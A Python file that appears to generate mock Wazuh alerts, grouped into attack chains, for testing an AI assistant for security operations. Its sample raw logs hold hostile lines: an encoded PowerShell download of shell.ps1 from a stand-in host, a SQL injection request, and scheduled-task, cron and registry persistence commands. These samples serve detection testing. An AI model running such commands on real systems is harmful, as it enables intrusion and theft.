"""
SOC AI Assistant — Mock Wazuh Alert Generator

Generates 50+ realistic Wazuh-format security alerts.
Alerts are organized into attack chains for correlation testing,
plus standalone alerts for variety.
"""

from datetime import datetime, timedelta
import random


def get_base_time():
    """Get a base timestamp for today."""
    now = datetime.utcnow()
    return now.replace(hour=8, minute=0, second=0, microsecond=0)


def generate_mock_alerts():
    """Generate 50+ realistic Wazuh alerts with attack chains."""
    base = get_base_time()
    alerts = []

    # ──────────────────────────────────────────────────
    # ATTACK CHAIN 1: Brute Force → Access → Priv Esc
    # ──────────────────────────────────────────────────
    attacker_ip = "185.220.101.42"
    target_host = "WEB-SERVER-01"

    for i in range(5):
        alerts.append({
            "timestamp": base + timedelta(minutes=20 + i),
            "source_ip": attacker_ip,
            "dest_ip": "10.0.1.50",
            "event_id": "4625",
            "rule_id": "60122",
            "severity": "Medium",
            "description": f"Windows: Multiple login failure (attempt {i+1})",
            "host": target_host,
            "agent": "agent-001",
            "raw_log": f'[2024-03-15 08:{20+i}:00] EventID=4625 SourceIP={attacker_ip} TargetUser=administrator Status=0xC000006D LogonType=10 WorkstationName={target_host}',
            "username": "administrator",
            "mitre_tactic": "Credential Access",
            "mitre_technique_id": "T1110.001",
            "mitre_technique_name": "Brute Force: Password Guessing",
            "source": "Wazuh",
        })

    alerts.append({
        "timestamp": base + timedelta(minutes=26),
        "source_ip": attacker_ip,
        "dest_ip": "10.0.1.50",
        "event_id": "4624",
        "rule_id": "60106",
        "severity": "High",
        "description": "Windows: Successful login after multiple failures",
        "host": target_host,
        "agent": "agent-001",
        "raw_log": f'[2024-03-15 08:26:00] EventID=4624 SourceIP={attacker_ip} TargetUser=administrator LogonType=10 AuthPackage=NTLM WorkstationName={target_host}',
        "username": "administrator",
        "mitre_tactic": "Initial Access",
        "mitre_technique_id": "T1078",
        "mitre_technique_name": "Valid Accounts",
        "source": "Wazuh",
    })

    alerts.append({
        "timestamp": base + timedelta(minutes=28),
        "source_ip": attacker_ip,
        "dest_ip": "10.0.1.50",
        "event_id": "4672",
        "rule_id": "60144",
        "severity": "Critical",
        "description": "Windows: Special privileges assigned to new logon",
        "host": target_host,
        "agent": "agent-001",
        "raw_log": f'[2024-03-15 08:28:00] EventID=4672 SubjectUser=administrator Privileges=SeDebugPrivilege,SeTakeOwnershipPrivilege,SeBackupPrivilege',
        "username": "administrator",
        "mitre_tactic": "Privilege Escalation",
        "mitre_technique_id": "T1078.002",
        "mitre_technique_name": "Valid Accounts: Domain Accounts",
        "source": "Wazuh",
    })

    alerts.append({
        "timestamp": base + timedelta(minutes=30),
        "source_ip": "10.0.1.50",
        "dest_ip": "10.0.1.50",
        "event_id": "4720",
        "rule_id": "60150",
        "severity": "Critical",
        "description": "Windows: A user account was created — possible persistence",
        "host": target_host,
        "agent": "agent-001",
        "raw_log": '[2024-03-15 08:30:00] EventID=4720 SubjectUser=administrator NewUser=svc_backup TargetDomain=CORP',
        "username": "administrator",
        "mitre_tactic": "Persistence",
        "mitre_technique_id": "T1136.001",
        "mitre_technique_name": "Create Account: Local Account",
        "source": "Wazuh",
    })

    # ──────────────────────────────────────────────────
    # ATTACK CHAIN 2: Phishing → Execution → C2
    # ──────────────────────────────────────────────────
    phish_host = "WORKSTATION-PC07"

    alerts.append({
        "timestamp": base + timedelta(minutes=75),
        "source_ip": "10.0.2.107",
        "dest_ip": "198.51.100.23",
        "event_id": "1",
        "rule_id": "92010",
        "severity": "Medium",
        "description": "Sysmon: Suspicious Office application spawning child process",
        "host": phish_host,
        "agent": "agent-007",
        "raw_log": '[2024-03-15 09:15:00] Sysmon EventID=1 Image=C:\\Windows\\System32\\cmd.exe ParentImage=C:\\Program Files\\Microsoft Office\\WINWORD.EXE CommandLine=cmd.exe /c powershell -ep bypass -e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==',
        "username": "john.doe",
        "mitre_tactic": "Execution",
        "mitre_technique_id": "T1204.002",
        "mitre_technique_name": "User Execution: Malicious File",
        "source": "Wazuh",
    })

    alerts.append({
        "timestamp": base + timedelta(minutes=76),
        "source_ip": "10.0.2.107",
        "dest_ip": "198.51.100.23",
        "event_id": "1",
        "rule_id": "92050",
        "severity": "Critical",
        "description": "Sysmon: PowerShell encoded command execution detected",
        "host": phish_host,
        "agent": "agent-007",
        "raw_log": '[2024-03-15 09:16:00] Sysmon EventID=1 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell.exe -ep bypass -e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHMAaABlAGwAbAAuAHAAcwAxAA== ParentImage=cmd.exe',
        "username": "john.doe",
        "mitre_tactic": "Execution",
        "mitre_technique_id": "T1059.001",
        "mitre_technique_name": "Command and Scripting Interpreter: PowerShell",
        "source": "Wazuh",
    })

    alerts.append({
        "timestamp": base + timedelta(minutes=78),
        "source_ip": "10.0.2.107",
        "dest_ip": "198.51.100.23",
        "event_id": "3",
        "rule_id": "92100",
        "severity": "Critical",
        "description": "Sysmon: Outbound connection to known C2 infrastructure",
        "host": phish_host,
        "agent": "agent-007",
        "raw_log": '[2024-03-15 09:18:00] Sysmon EventID=3 Image=powershell.exe DestinationIP=198.51.100.23 DestinationPort=443 Protocol=TCP DestinationHostname=cdn-update-service.com',
        "username": "john.doe",
        "mitre_tactic": "Command and Control",
        "mitre_technique_id": "T1071.001",
        "mitre_technique_name": "Application Layer Protocol: Web Protocols",
        "source": "Wazuh",
    })

    alerts.append({
        "timestamp": base + timedelta(minutes=80),
        "source_ip": "10.0.2.107",
        "dest_ip": "10.0.2.107",
        "event_id": "1",
        "rule_id": "92120",
        "severity": "High",
        "description": "Sysmon: Scheduled task created for persistence",
        "host": phish_host,
        "agent": "agent-007",
        "raw_log": '[2024-03-15 09:20:00] Sysmon EventID=1 Image=schtasks.exe CommandLine=schtasks /create /tn "WindowsUpdate" /tr "C:\\Users\\john.doe\\AppData\\Local\\Temp\\update.exe" /sc onlogon /ru SYSTEM',
        "username": "john.doe",
        "mitre_tactic": "Persistence",
        "mitre_technique_id": "T1053.005",
        "mitre_technique_name": "Scheduled Task/Job: Scheduled Task",
        "source": "Wazuh",
    })

    # ──────────────────────────────────────────────────
    # ATTACK CHAIN 3: Lateral Movement
    # ──────────────────────────────────────────────────
    lateral_host = "DC-SERVER-01"

    alerts.append({
        "timestamp": base + timedelta(minutes=120),
        "source_ip": "10.0.1.50",
        "dest_ip": "10.0.0.0/24",
        "event_id": "3",
        "rule_id": "92200",
        "severity": "Medium",
        "description": "Sysmon: Network scan detected — Discovery activity",
        "host": target_host,
        "agent": "agent-001",
        "raw_log": '[2024-03-15 10:00:00] Multiple Sysmon EventID=3 connections from 10.0.1.50 to 10.0.0.1-254 on ports 445,139,3389,22 within 30 seconds',
        "username": "svc_backup",
        "mitre_tactic": "Discovery",
        "mitre_technique_id": "T1046",
        "mitre_technique_name": "Network Service Discovery",
        "source": "Wazuh",
    })

    alerts.append({
        "timestamp": base + timedelta(minutes=125),
        "source_ip": "10.0.1.50",
        "dest_ip": "10.0.0.10",
        "event_id": "1",
        "rule_id": "92210",
        "severity": "Critical",
        "description": "Sysmon: PsExec remote execution on domain controller",
        "host": target_host,
        "agent": "agent-001",
        "raw_log": '[2024-03-15 10:05:00] Sysmon EventID=1 Image=C:\\Windows\\PSEXESVC.exe SourceHost=10.0.1.50 TargetHost=10.0.0.10 User=CORP\\svc_backup',
        "username": "svc_backup",
        "mitre_tactic": "Lateral Movement",
        "mitre_technique_id": "T1570",
        "mitre_technique_name": "Lateral Tool Transfer",
        "source": "Wazuh",
    })

    alerts.append({
        "timestamp": base + timedelta(minutes=130),
        "source_ip": "10.0.1.50",
        "dest_ip": "10.0.0.10",
        "event_id": "11",
        "rule_id": "92215",
        "severity": "High",
        "description": "Sysmon: SMB file copy to domain controller",
        "host": lateral_host,
        "agent": "agent-010",
        "raw_log": '[2024-03-15 10:10:00] Sysmon EventID=11 TargetFilename=\\\\DC-SERVER-01\\C$\\Windows\\Temp\\payload.exe SourceIP=10.0.1.50',
        "username": "svc_backup",
        "mitre_tactic": "Lateral Movement",
        "mitre_technique_id": "T1021.002",
        "mitre_technique_name": "Remote Services: SMB/Windows Admin Shares",
        "source": "Wazuh",
    })

    alerts.append({
        "timestamp": base + timedelta(minutes=135),
        "source_ip": "10.0.0.10",
        "dest_ip": "10.0.0.10",
        "event_id": "7045",
        "rule_id": "92220",
        "severity": "Critical",
        "description": "Windows: New service installed on domain controller",
        "host": lateral_host,
        "agent": "agent-010",
        "raw_log": '[2024-03-15 10:15:00] EventID=7045 ServiceName=WindowsUpdateSvc ImagePath=C:\\Windows\\Temp\\payload.exe ServiceType=own process StartType=auto',
        "username": "SYSTEM",
        "mitre_tactic": "Persistence",
        "mitre_technique_id": "T1543.003",
        "mitre_technique_name": "Create or Modify System Process: Windows Service",
        "source": "Wazuh",
    })

    # ──────────────────────────────────────────────────
    # STANDALONE ALERTS (variety)
    # ──────────────────────────────────────────────────

    # Malware detection
    alerts.append({
        "timestamp": base + timedelta(minutes=45),
        "source_ip": "10.0.3.22",
        "dest_ip": "10.0.3.22",
        "event_id": "550",
        "rule_id": "87105",
        "severity": "Critical",
        "description": "ClamAV: Malware detected — Win.Ransomware.WannaCry-6320371-0",
        "host": "FILE-SERVER-03",
        "agent": "agent-003",
        "raw_log": '[2024-03-15 08:45:00] ClamAV FOUND: C:\\Users\\Public\\Documents\\invoice.exe: Win.Ransomware.WannaCry-6320371-0 FOUND',
        "username": None,
        "mitre_tactic": "Impact",
        "mitre_technique_id": "T1486",
        "mitre_technique_name": "Data Encrypted for Impact",
        "source": "Wazuh",
    })

    # Firewall block
    alerts.append({
        "timestamp": base + timedelta(minutes=50),
        "source_ip": "203.0.113.50",
        "dest_ip": "10.0.1.80",
        "event_id": "DROP",
        "rule_id": "80702",
        "severity": "Low",
        "description": "Firewall: Inbound connection dropped from external IP",
        "host": "FW-EDGE-01",
        "agent": "agent-fw01",
        "raw_log": '[2024-03-15 08:50:00] FW DROP src=203.0.113.50 dst=10.0.1.80 proto=TCP dpt=3389 IN=eth0',
        "username": None,
        "mitre_tactic": "Initial Access",
        "mitre_technique_id": "T1190",
        "mitre_technique_name": "Exploit Public-Facing Application",
        "source": "Firewall",
    })

    # Integrity monitoring
    alerts.append({
        "timestamp": base + timedelta(minutes=55),
        "source_ip": "10.0.0.10",
        "dest_ip": "10.0.0.10",
        "event_id": "550",
        "rule_id": "87901",
        "severity": "High",
        "description": "FIM: Critical system file modified — /etc/passwd",
        "host": "LINUX-DB-01",
        "agent": "agent-db01",
        "raw_log": '[2024-03-15 08:55:00] ossec: FIM alert: File /etc/passwd modified. Size changed from 2845 to 2912. MD5 changed. User=root',
        "username": "root",
        "mitre_tactic": "Persistence",
        "mitre_technique_id": "T1098",
        "mitre_technique_name": "Account Manipulation",
        "source": "Wazuh",
    })

    # Rootkit detection
    alerts.append({
        "timestamp": base + timedelta(minutes=60),
        "source_ip": "10.0.4.15",
        "dest_ip": "10.0.4.15",
        "event_id": "510",
        "rule_id": "87400",
        "severity": "Critical",
        "description": "Rootcheck: Hidden process detected — possible rootkit",
        "host": "APP-SERVER-02",
        "agent": "agent-app02",
        "raw_log": '[2024-03-15 09:00:00] ossec: rootcheck: Process hidden from /proc: PID 31337 Name=.hidden_sshd',
        "username": None,
        "mitre_tactic": "Defense Evasion",
        "mitre_technique_id": "T1014",
        "mitre_technique_name": "Rootkit",
        "source": "Wazuh",
    })

    # Log clearing
    alerts.append({
        "timestamp": base + timedelta(minutes=95),
        "source_ip": "10.0.1.50",
        "dest_ip": "10.0.1.50",
        "event_id": "1102",
        "rule_id": "60190",
        "severity": "High",
        "description": "Windows: Security event log was cleared",
        "host": target_host,
        "agent": "agent-001",
        "raw_log": '[2024-03-15 09:35:00] EventID=1102 SubjectUser=administrator SubjectDomain=CORP Channel=Security',
        "username": "administrator",
        "mitre_tactic": "Defense Evasion",
        "mitre_technique_id": "T1070.001",
        "mitre_technique_name": "Indicator Removal: Clear Windows Event Logs",
        "source": "Wazuh",
    })

    # SSH brute force (Linux)
    for i in range(4):
        alerts.append({
            "timestamp": base + timedelta(minutes=100 + i),
            "source_ip": "45.33.32.156",
            "dest_ip": "10.0.5.20",
            "event_id": "5503",
            "rule_id": "5503",
            "severity": "Medium",
            "description": f"SSHD: Authentication failure from 45.33.32.156 (attempt {i+1})",
            "host": "LINUX-WEB-01",
            "agent": "agent-web01",
            "raw_log": f'[2024-03-15 09:{40+i}:00] sshd[28374]: Failed password for root from 45.33.32.156 port {5000+i} ssh2',
            "username": "root",
            "mitre_tactic": "Credential Access",
            "mitre_technique_id": "T1110.001",
            "mitre_technique_name": "Brute Force: Password Guessing",
            "source": "Wazuh",
        })

    # Data exfiltration
    alerts.append({
        "timestamp": base + timedelta(minutes=150),
        "source_ip": "10.0.2.107",
        "dest_ip": "104.21.45.67",
        "event_id": "3",
        "rule_id": "92300",
        "severity": "Critical",
        "description": "Sysmon: Large outbound data transfer to external IP (possible exfiltration)",
        "host": phish_host,
        "agent": "agent-007",
        "raw_log": '[2024-03-15 10:30:00] Sysmon EventID=3 Image=powershell.exe DestinationIP=104.21.45.67 DestinationPort=443 BytesSent=52428800 Protocol=TCP',
        "username": "john.doe",
        "mitre_tactic": "Exfiltration",
        "mitre_technique_id": "T1041",
        "mitre_technique_name": "Exfiltration Over C2 Channel",
        "source": "Wazuh",
    })

    # Suspicious DNS query
    alerts.append({
        "timestamp": base + timedelta(minutes=82),
        "source_ip": "10.0.2.107",
        "dest_ip": "10.0.0.2",
        "event_id": "22",
        "rule_id": "92150",
        "severity": "High",
        "description": "Sysmon: DNS query to suspicious domain — possible DGA",
        "host": phish_host,
        "agent": "agent-007",
        "raw_log": '[2024-03-15 09:22:00] Sysmon EventID=22 Image=powershell.exe QueryName=xk3j8f9a2b.com QueryResults=198.51.100.23',
        "username": "john.doe",
        "mitre_tactic": "Command and Control",
        "mitre_technique_id": "T1568.002",
        "mitre_technique_name": "Dynamic Resolution: Domain Generation Algorithms",
        "source": "Wazuh",
    })

    # Registry modification
    alerts.append({
        "timestamp": base + timedelta(minutes=32),
        "source_ip": "10.0.1.50",
        "dest_ip": "10.0.1.50",
        "event_id": "13",
        "rule_id": "92060",
        "severity": "High",
        "description": "Sysmon: Registry Run key modified for persistence",
        "host": target_host,
        "agent": "agent-001",
        "raw_log": '[2024-03-15 08:32:00] Sysmon EventID=13 EventType=SetValue TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefenderUpdate Details=C:\\ProgramData\\defender_update.exe Image=reg.exe User=administrator',
        "username": "administrator",
        "mitre_tactic": "Persistence",
        "mitre_technique_id": "T1547.001",
        "mitre_technique_name": "Boot or Logon Autostart Execution: Registry Run Keys",
        "source": "Wazuh",
    })

    # Cryptominer
    alerts.append({
        "timestamp": base + timedelta(minutes=110),
        "source_ip": "10.0.6.30",
        "dest_ip": "pool.minexmr.com",
        "event_id": "3",
        "rule_id": "92350",
        "severity": "High",
        "description": "Sysmon: Outbound connection to known cryptomining pool",
        "host": "DEV-SERVER-01",
        "agent": "agent-dev01",
        "raw_log": '[2024-03-15 09:50:00] Sysmon EventID=3 Image=xmrig.exe DestinationHostname=pool.minexmr.com DestinationPort=4444 Protocol=TCP',
        "username": "www-data",
        "mitre_tactic": "Impact",
        "mitre_technique_id": "T1496",
        "mitre_technique_name": "Resource Hijacking",
        "source": "Wazuh",
    })

    # Web shell detection
    alerts.append({
        "timestamp": base + timedelta(minutes=115),
        "source_ip": "172.16.0.5",
        "dest_ip": "10.0.1.80",
        "event_id": "11",
        "rule_id": "87502",
        "severity": "Critical",
        "description": "FIM: Web shell uploaded to web server — /var/www/html/uploads/cmd.php",
        "host": "LINUX-WEB-01",
        "agent": "agent-web01",
        "raw_log": '[2024-03-15 09:55:00] FIM: New file detected: /var/www/html/uploads/cmd.php Size=1234 MD5=d41d8cd98f00b204e9800998ecf8427e Owner=www-data',
        "username": "www-data",
        "mitre_tactic": "Persistence",
        "mitre_technique_id": "T1505.003",
        "mitre_technique_name": "Server Software Component: Web Shell",
        "source": "Wazuh",
    })

    # Privilege escalation via sudo
    alerts.append({
        "timestamp": base + timedelta(minutes=140),
        "source_ip": "10.0.5.20",
        "dest_ip": "10.0.5.20",
        "event_id": "5401",
        "rule_id": "5401",
        "severity": "Medium",
        "description": "PAM: Sudo command executed by non-admin user",
        "host": "LINUX-WEB-01",
        "agent": "agent-web01",
        "raw_log": '[2024-03-15 10:20:00] sudo: www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash',
        "username": "www-data",
        "mitre_tactic": "Privilege Escalation",
        "mitre_technique_id": "T1548.003",
        "mitre_technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
        "source": "Wazuh",
    })

    # Process injection
    alerts.append({
        "timestamp": base + timedelta(minutes=85),
        "source_ip": "10.0.2.107",
        "dest_ip": "10.0.2.107",
        "event_id": "8",
        "rule_id": "92160",
        "severity": "Critical",
        "description": "Sysmon: CreateRemoteThread — possible process injection",
        "host": phish_host,
        "agent": "agent-007",
        "raw_log": '[2024-03-15 09:25:00] Sysmon EventID=8 SourceImage=C:\\Users\\john.doe\\AppData\\Local\\Temp\\update.exe TargetImage=C:\\Windows\\System32\\svchost.exe StartFunction=LoadLibraryA',
        "username": "john.doe",
        "mitre_tactic": "Defense Evasion",
        "mitre_technique_id": "T1055.003",
        "mitre_technique_name": "Process Injection: Thread Execution Hijacking",
        "source": "Wazuh",
    })

    # SQL injection attempt
    alerts.append({
        "timestamp": base + timedelta(minutes=160),
        "source_ip": "203.0.113.100",
        "dest_ip": "10.0.1.80",
        "event_id": "31101",
        "rule_id": "31101",
        "severity": "High",
        "description": "Apache: SQL injection attempt detected in web request",
        "host": "LINUX-WEB-01",
        "agent": "agent-web01",
        "raw_log": "[2024-03-15 10:40:00] Apache access_log: 203.0.113.100 - - \"GET /products?id=1' UNION SELECT username,password FROM users-- HTTP/1.1\" 200 4523",
        "username": None,
        "mitre_tactic": "Initial Access",
        "mitre_technique_id": "T1190",
        "mitre_technique_name": "Exploit Public-Facing Application",
        "source": "Wazuh",
    })

    # Suspicious Cron job
    alerts.append({
        "timestamp": base + timedelta(minutes=142),
        "source_ip": "10.0.5.20",
        "dest_ip": "10.0.5.20",
        "event_id": "2830",
        "rule_id": "2830",
        "severity": "Medium",
        "description": "Cron: New crontab entry created by www-data",
        "host": "LINUX-WEB-01",
        "agent": "agent-web01",
        "raw_log": '[2024-03-15 10:22:00] crontab: (www-data) REPLACE (www-data) * * * * * /tmp/.hidden/beacon.sh',
        "username": "www-data",
        "mitre_tactic": "Persistence",
        "mitre_technique_id": "T1053.003",
        "mitre_technique_name": "Scheduled Task/Job: Cron",
        "source": "Wazuh",
    })

    # VPN anomaly
    alerts.append({
        "timestamp": base + timedelta(minutes=170),
        "source_ip": "91.108.56.200",
        "dest_ip": "10.0.0.1",
        "event_id": "VPN001",
        "rule_id": "80101",
        "severity": "Medium",
        "description": "VPN: Login from unusual geographic location (Russia)",
        "host": "VPN-GW-01",
        "agent": "agent-vpn01",
        "raw_log": '[2024-03-15 10:50:00] VPN: user=sarah.chen src=91.108.56.200 geo=RU city=Moscow previous_geo=US elapsed_since_last=2h',
        "username": "sarah.chen",
        "mitre_tactic": "Initial Access",
        "mitre_technique_id": "T1078",
        "mitre_technique_name": "Valid Accounts",
        "source": "VPN",
    })

    # Windows Defender disabled
    alerts.append({
        "timestamp": base + timedelta(minutes=88),
        "source_ip": "10.0.2.107",
        "dest_ip": "10.0.2.107",
        "event_id": "5001",
        "rule_id": "61600",
        "severity": "High",
        "description": "Windows Defender: Real-time protection was disabled",
        "host": phish_host,
        "agent": "agent-007",
        "raw_log": '[2024-03-15 09:28:00] EventID=5001 Windows Defender Real-Time Protection disabled by powershell.exe User=john.doe',
        "username": "john.doe",
        "mitre_tactic": "Defense Evasion",
        "mitre_technique_id": "T1562.001",
        "mitre_technique_name": "Impair Defenses: Disable or Modify Tools",
        "source": "Wazuh",
    })

    # LSASS access
    alerts.append({
        "timestamp": base + timedelta(minutes=90),
        "source_ip": "10.0.1.50",
        "dest_ip": "10.0.1.50",
        "event_id": "10",
        "rule_id": "92170",
        "severity": "Critical",
        "description": "Sysmon: LSASS process access — possible credential dumping",
        "host": target_host,
        "agent": "agent-001",
        "raw_log": '[2024-03-15 09:30:00] Sysmon EventID=10 SourceImage=C:\\Windows\\Temp\\procdump64.exe TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1010',
        "username": "administrator",
        "mitre_tactic": "Credential Access",
        "mitre_technique_id": "T1003.001",
        "mitre_technique_name": "OS Credential Dumping: LSASS Memory",
        "source": "Wazuh",
    })

    # Kerberoasting
    alerts.append({
        "timestamp": base + timedelta(minutes=92),
        "source_ip": "10.0.1.50",
        "dest_ip": "10.0.0.10",
        "event_id": "4769",
        "rule_id": "60180",
        "severity": "High",
        "description": "Windows: Kerberos service ticket requested with RC4 encryption (possible Kerberoasting)",
        "host": lateral_host,
        "agent": "agent-010",
        "raw_log": '[2024-03-15 09:32:00] EventID=4769 ServiceName=MSSQLSvc/DB-SERVER-01:1433 TicketEncryptionType=0x17 ClientAddress=10.0.1.50 TargetUser=svc_sql@CORP.LOCAL',
        "username": "administrator",
        "mitre_tactic": "Credential Access",
        "mitre_technique_id": "T1558.003",
        "mitre_technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
        "source": "Wazuh",
    })

    # Email - suspicious attachment
    alerts.append({
        "timestamp": base + timedelta(minutes=70),
        "source_ip": "external",
        "dest_ip": "10.0.2.107",
        "event_id": "MAIL001",
        "rule_id": "86001",
        "severity": "Medium",
        "description": "Email: Suspicious attachment received — .iso file from unknown sender",
        "host": "MAIL-GW-01",
        "agent": "agent-mail01",
        "raw_log": '[2024-03-15 09:10:00] Email: From=invoice@trusted-vendor.biz To=john.doe@corp.local Subject="Q1 Invoice" Attachment=Invoice_Q1_2024.iso Size=4.2MB SPF=fail DKIM=fail',
        "username": "john.doe",
        "mitre_tactic": "Initial Access",
        "mitre_technique_id": "T1566.001",
        "mitre_technique_name": "Phishing: Spearphishing Attachment",
        "source": "Email Gateway",
    })

    # IDS alert
    alerts.append({
        "timestamp": base + timedelta(minutes=162),
        "source_ip": "203.0.113.100",
        "dest_ip": "10.0.1.80",
        "event_id": "IDS2001",
        "rule_id": "86502",
        "severity": "High",
        "description": "Suricata: ET WEB_SPECIFIC_APPS PHP Remote Code Execution attempt",
        "host": "IDS-SENSOR-01",
        "agent": "agent-ids01",
        "raw_log": '[2024-03-15 10:42:00] Suricata [1:2024792:3] ET WEB_SPECIFIC_APPS PHP Remote Code Execution src=203.0.113.100 dst=10.0.1.80 proto=TCP dpt=80',
        "username": None,
        "mitre_tactic": "Execution",
        "mitre_technique_id": "T1059",
        "mitre_technique_name": "Command and Scripting Interpreter",
        "source": "IDS/IPS",
    })

    # Sort by timestamp
    alerts.sort(key=lambda x: x["timestamp"])

    return alerts
